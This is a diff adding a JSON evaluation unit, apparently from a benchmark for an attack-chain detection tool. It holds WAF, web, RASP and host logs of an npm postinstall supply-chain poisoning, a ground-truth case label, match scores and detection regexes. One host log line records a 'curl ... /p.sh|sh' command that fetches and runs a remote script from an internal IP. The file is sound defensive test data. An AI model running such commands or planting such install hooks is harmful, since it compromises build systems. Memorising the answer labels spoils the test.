@@ -1,0 +1,252 @@
+{
+ "unit": 1121,
+ "gt": {
+  "gt_class": "exact",
+  "gt_case": "CASE-007",
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "与 CASE-007 入库时使用同一组日志"
+ },
+ "technique": "npm 依赖 postinstall 钩子投毒（安装期拉取远程脚本）",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-07-09 02:52:45",
+   "source": "waf",
+   "log_id": "WAF0459739",
+   "content": "/api/v2/pipeline/run job=deps&pkg=lodahs-build-utils@2.3.1&hook=postinstall Mozilla/5.0 (Windows NT 10.0; Win6",
+   "event_id": "1121-WAF0459739"
+  },
+  {
+   "timestamp": "2026-07-09 02:52:46",
+   "source": "web",
+   "log_id": "WEB0462729",
+   "content": "/api/v2/pipeline/run job=deps&pkg=lodahs-build-utils@2.3.1&hook=postinstall Mozilla/5.0 (Windows NT 10.0; Win6",
+   "event_id": "1121-WEB0462729"
+  },
+  {
+   "timestamp": "2026-07-09 02:52:48",
+   "source": "rasp",
+   "log_id": "RASP0508665",
+   "content": "https://app-node-41.ops-corp.com/api/v2/pipeline/run {\"npm_lifecycle\": \"postinstall\", \"spawn\": \"sh -c\"} Mozill",
+   "event_id": "1121-RASP0508665"
+  },
+  {
+   "timestamp": "2026-07-09 02:53:46",
+   "source": "hids",
+   "log_id": "HID0498234",
+   "content": "curl 10.20.5.19/p.sh|sh /bin/sh curl 10.20.5.19/p.sh|sh <== /bin/sh -c 'install.js' <== node /usr/lib/npm",
+   "event_id": "1121-HID0498234"
+  }
+ ],
+ "retrieval_full": [
+  {
+   "case_id": "CASE-007",
+   "name": "供应链投毒：npm postinstall 钩子执行远程脚本",
+   "summary": "CI 流水线参数触发依赖安装 → 应用侧记录 postinstall 钩子派生 sh → 主机侧 curl 远程脚本并管道执行。",
+   "matched_steps": 3,
+   "detected_steps": 3,
+   "total_steps": 3,
+   "shape": "complete",
+   "longest_run": 3,
+   "tier": "strong",
+   "order_ok": true,
+   "order_assessable": true,
+   "source_fit_ratio": 1.0,
+   "evidence": [
+    {
+     "step_id": "S1",
+     "action_id": "ci_pipeline_npm_postinstall",
+     "label": "CI 流水线触发依赖安装",
+     "generic": false,
+     "event_ids": [
+      "1121-WAF0459739",
+      "1121-WEB0462729"
+     ],
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "aligned_event_id": "1121-WEB0462729",
+     "detections": [
+      {
+       "event_id": "1121-WAF0459739",
+       "source": "waf",
+       "timestamp": "2026-07-09 02:52:45"
+      },
+      {
+       "event_id": "1121-WEB0462729",
+       "source": "web",
+       "timestamp": "2026-07-09 02:52:46"
+      }
+     ]
+    },
+    {
+     "step_id": "S2",
+     "action_id": "npm_lifecycle_postinstall_spawn",
+     "label": "应用侧 postinstall 派生 shell",
+     "generic": false,
+     "event_ids": [
+      "1121-RASP0508665"
+     ],
+     "sources": [
+      "rasp"
+     ],
+     "aligned_event_id": "1121-RASP0508665",
+     "detections": [
+      {
+       "event_id": "1121-RASP0508665",
+       "source": "rasp",
+       "timestamp": "2026-07-09 02:52:48"
+      }
+     ]
+    },
+    {
+     "step_id": "S3",
+     "action_id": "npm_hook_remote_shell",
+     "label": "钩子拉取远程脚本并执行",
+     "generic": false,
+     "event_ids": [
+      "1121-HID0498234"
+     ],
+     "sources": [
+      "hids"
+     ],
+     "aligned_event_id": "1121-HID0498234",
+     "detections": [
+      {
+       "event_id": "1121-HID0498234",
+       "source": "hids",
+       "timestamp": "2026-07-09 02:53:46"
+      }
+     ]
+    }
+   ],
+   "source_mismatches": [
+    {
+     "step_id": "S1",
+     "event_id": "1121-RASP0508665",
+     "observed_source": "rasp",
+     "expected_sources": [
+      "waf",
+      "web"
+     ]
+    }
+   ],
+   "unaligned_detections": [
+    {
+     "event_id": "1121-WAF0459739",
+     "step_id": "S1",
+     "action_id": "ci_pipeline_npm_postinstall",
+     "source": "waf",
+     "timestamp": "2026-07-09 02:52:45",
+     "reason": "extra_detection_for_S1"
+    }
+   ],
+   "keyword_score": 21,
+   "keyword_details": [
+    "keyword +3: postinstall",
+    "keyword +3: pipeline/run",
+    "keyword +3: install.js",
+    "probe +4: hook=postinstall",
+    "probe +4: \\\"npm_lifecycle\\\"\\s*:\\s*\\\"postinstall\\\"",
+    "probe +4: curl\\s+\\d{1,3}(?:\\.\\d{1,3}){3}/p\\.sh\\|sh"
+   ],
+   "mitre": [
+    "T1195.002",
+    "T1059.004"
+   ],
+   "unobserved_steps": [],
+   "before_steps": [],
+   "gap_steps": [],
+   "predict_next": null,
+   "matched_non_generic_steps": 3,
+   "pattern_scope": {
+    "attack_family": "供应链 / CI 依赖投毒",
+    "variant_note": "单样本归纳；包名与钩子实现来自该样本，其它包管理器生态未验证。"
+   },
+   "negative_and_unknown_evidence": {
+    "not_observed": [
+     "凭据外带",
+     "制品投毒"
+    ],
+    "interpretation": "未观察到不等同于确认不存在；需结合日志覆盖范围判断。"
+   },
+   "provenance": {
+    "observation_count": 1,
+    "evidence_status": "single_observation_demo",
+    "observation_count_note": "由 dataset 每类第 1 个 unit 作为首批代表样本入库；原始行保存在 raw_logs.csv。"
+   }
+  }
+ ],
+ "evidence_for_agent": {
+  "tier": "strong",
+  "shape": "complete",
+  "matched_steps": 3,
+  "total_steps": 3,
+  "order_ok": true,
+  "order_assessable": true,
+  "source_fit_ratio": 1.0,
+  "steps": [
+   {
+    "step_id": "S1",
+    "label": "CI 流水线触发依赖安装",
+    "sources": [
+     "waf",
+     "web"
+    ],
+    "generic": false,
+    "event_ids": [
+     "1121-WAF0459739",
+     "1121-WEB0462729"
+    ]
+   },
+   {
+    "step_id": "S2",
+    "label": "应用侧 postinstall 派生 shell",
+    "sources": [
+     "rasp"
+    ],
+    "generic": false,
+    "event_ids": [
+     "1121-RASP0508665"
+    ]
+   },
+   {
+    "step_id": "S3",
+    "label": "钩子拉取远程脚本并执行",
+    "sources": [
+     "hids"
+    ],
+    "generic": false,
+    "event_ids": [
+     "1121-HID0498234"
+    ]
+   }
+  ],
+  "unobserved_steps": [],
+  "gap_steps": [],
+  "before_steps": [],
+  "predict_next": null,
+  "source_mismatches": [
+   {
+    "step_id": "S1",
+    "observed_source": "rasp",
+    "expected_sources": [
+     "waf",
+     "web"
+    ]
+   }
+  ],
+  "keyword_score": 21,
+  "mitre": [
+   "T1195.002",
+   "T1059.004"
+  ]
+ }
+}
